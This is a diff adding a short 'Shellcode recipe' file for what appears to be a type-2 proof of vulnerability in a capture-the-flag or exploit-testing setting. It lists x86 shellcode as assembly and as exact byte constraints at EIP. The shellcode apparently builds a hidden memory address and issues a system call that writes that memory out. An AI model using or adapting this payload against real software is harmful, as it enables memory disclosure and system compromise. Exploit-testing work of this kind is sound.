@@ -1,0 +1,52 @@
+# Shellcode recipe for T2 PoV
+# shellcode: 
+# xor eax,eax
+# xor ebx,ebx
+# xor edx,edx
+# mov al,0x2
+# mov bl,0x1
+# mov cx,0x32d4
+# xor cx,0x7193
+# shl ecx,byte 0x8
+# mov cl,0xc0
+# shl ecx,byte 0x8
+# mov dh,0x10
+# xor esi,esi
+# int 0x80
+*type 2*
+*skip = 0*
+*EIP points to executable memory*
+[EIP+0] == 0x31
+[EIP+1] == 0xc0
+[EIP+2] == 0x31
+[EIP+3] == 0xdb
+[EIP+4] == 0x31
+[EIP+5] == 0xd2
+[EIP+6] == 0xb0
+[EIP+7] == 0x02
+[EIP+8] == 0xb3
+[EIP+9] == 0x01
+[EIP+10] == 0x66
+[EIP+11] == 0xb9
+[EIP+12] == 0xd4
+[EIP+13] == 0x32
+[EIP+14] == 0x66
+[EIP+15] == 0x81
+[EIP+16] == 0xf1
+[EIP+17] == 0x93
+[EIP+18] == 0x71
+[EIP+19] == 0xc1
+[EIP+20] == 0xe1
+[EIP+21] == 0x08
+[EIP+22] == 0xb1
+[EIP+23] == 0xc0
+[EIP+24] == 0xc1
+[EIP+25] == 0xe1
+[EIP+26] == 0x08
+[EIP+27] == 0xb6
+[EIP+28] == 0x10
+[EIP+29] == 0x31
+[EIP+30] == 0xf6
+[EIP+31] == 0xcd
+[EIP+32] == 0x80
+
